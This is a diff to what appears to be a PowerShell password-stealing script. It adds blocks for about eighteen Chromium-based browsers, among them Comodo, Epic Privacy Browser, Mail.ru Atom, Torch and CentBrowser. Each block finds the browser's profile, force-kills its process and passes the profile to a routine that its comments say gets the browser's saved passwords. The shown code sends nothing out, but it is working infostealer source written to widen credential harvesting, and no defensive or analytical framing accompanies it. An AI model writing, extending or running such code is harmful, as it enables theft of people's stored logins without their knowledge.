@@ -1299,6 +1299,137 @@ Start-Sleep 1
 chromiumBrowser -Path "$env:appdata\..\Local\DCBrowser" -Browser "DCBrowser"
 }
 
+# Get 7Star Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\7Star\7Star\User Data\Local State")){
+	taskkill /IM 7star.exe /F
+	Start-Sleep 1
+	chromiumBrowser -Path "$env:appdata\..\Local\7Star\7Star" -Browser "7Star"
+}
+
+# Get Comodo Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\Dragon\Comodo\User Data\Local State")){
+	taskkill /IM comodo.exe /F
+	Start-Sleep 1
+	chromiumBrowser -Path "$env:appdata\..\Local\Dragon\Comodo" -Browser "Comodo"
+}
+
+# Get Elements Browser Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\Elements Browser\User Data\Local State")){
+	taskkill /IM ElementsBrowser.exe /F
+	Start-Sleep 1
+	chromiumBrowser -Path "$env:appdata\..\Local\Elements Browser" -Browser "ElementsBrowser"
+}
+
+# Get Epic Privacy Browser Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\Epic Privacy Browser\User Data\Local State")){
+	taskkill /IM EpicPrivacyBrowser.exe /F
+	Start-Sleep 1
+	chromiumBrowser -Path "$env:appdata\..\Local\Epic Privacy Browser" -Browser "EpicPrivacyBrowser"
+}
+
+# Get chedot Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\Chedot\User Data\Local State")){
+	taskkill /IM chedot.exe /F
+	Start-Sleep 1
+	chromiumBrowser -Path "$env:appdata\..\Local\Chedot" -Browser "Chedot"
+}
+
+# Get ChromePlus Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\ChromePlus\MappleStudio\User Data\Local State")){
+	taskkill /IM chromeplus.exe /F
+	Start-Sleep 1
+	chromiumBrowser -Path "$env:appdata\..\Local\ChromePlus\MappleStudio" -Browser "ChromePlus"
+}
+
+# Get uCozMedia Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\uCozMedia\Uran\User Data\Local State")){
+	taskkill /IM ucozmedia.exe /F
+	Start-Sleep 1
+	chromiumBrowser -Path "$env:appdata\..\Local\uCozMedia\Uran" -Browser "uCozMedia"
+}
+
+# Get Mail.ru Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\Mail.ru\Atom\User Data\Local State")){
+	taskkill /IM mailru.exe /F
+	Start-Sleep 1
+	chromiumBrowser -Path "$env:appdata\..\Local\Mail.ru\Atom" -Browser "MailRU"
+}
+
+# Get amigo Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\amigo\User Data\Local State")){
+	taskkill /IM amigo.exe /F
+	Start-Sleep 1
+	chromiumBrowser -Path "$env:appdata\..\Local\amigo" -Browser "amigo"
+}
+
+# Get Kometa Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\Kometa\User Data\Local State")){
+	taskkill /IM kometa.exe /F
+	Start-Sleep 1
+	chromiumBrowser -Path "$env:appdata\..\Local\Kometa" -Browser "Kometa"
+}
+
+# Get Orbitum Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\Orbitum\User Data\Local State")){
+	taskkill /IM orbitum.exe /F
+	Start-Sleep 1
+	chromiumBrowser -Path "$env:appdata\..\Local\Orbitum" -Browser "Orbitum"
+}
+
+# Get CooWoo Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\CooWoo\User Data\Local State")){
+	taskkill /IM coowoo.exe /F
+	Start-Sleep 1
+	chromiumBrowser -Path "$env:appdata\..\Local\CooWoo" -Browser "CooWoo"
+}
+
+# Get Iridium Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\Iridium\User Data\Local State")){
+	taskkill /IM iridium.exe /F
+	Start-Sleep 1
+	chromiumBrowser -Path "$env:appdata\..\Local\Iridium" -Browser "Iridium"
+}
+if([System.IO.File]::Exists("$env:appdata\..\Local\Iridium\Iridium\User Data\Local State")){
+	taskkill /IM iridium.exe /F
+	Start-Sleep 1
+	chromiumBrowser -Path "$env:appdata\..\Local\Iridium\Iridium" -Browser "Iridium"
+}
+
+# Get liebao Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\liebao\User Data\Local State")){
+	taskkill /IM liebao.exe /F
+	Start-Sleep 1
+	chromiumBrowser -Path "$env:appdata\..\Local\liebao" -Browser "liebao"
+}
+
+# Get Qip Surf Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\Qip Surf\User Data\Local State")){
+	taskkill /IM qipsurf.exe /F
+	Start-Sleep 1
+	chromiumBrowser -Path "$env:appdata\..\Local\Qip Surf" -Browser "QipSurf"
+}
+
+# Get Torch Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\Torch\User Data\Local State")){
+	taskkill /IM torch.exe /F
+	Start-Sleep 1
+	chromiumBrowser -Path "$env:appdata\..\Local\Torch" -Browser "Torch"
+}
+
+# Get Sputnik Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\Sputnik\Sputnik\User Data\Local State")){
+	taskkill /IM sputnik.exe /F
+	Start-Sleep 1
+	chromiumBrowser -Path "$env:appdata\..\Local\Sputnik\Sputnik" -Browser "Sputnik"
+}
+
+# Get CentBrowser Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\CentBrowser\User Data\Local State")){
+	taskkill /IM centbrowser.exe /F
+	Start-Sleep 1
+	chromiumBrowser -Path "$env:appdata\..\Local\CentBrowser" -Browser "CentBrowser"
+}
+
 # Get SogouExplorer Passwords
 $path="$env:appdata\..\Local\SogouExplorer\Webkit"
 if([System.IO.File]::Exists("$path\Local State")){
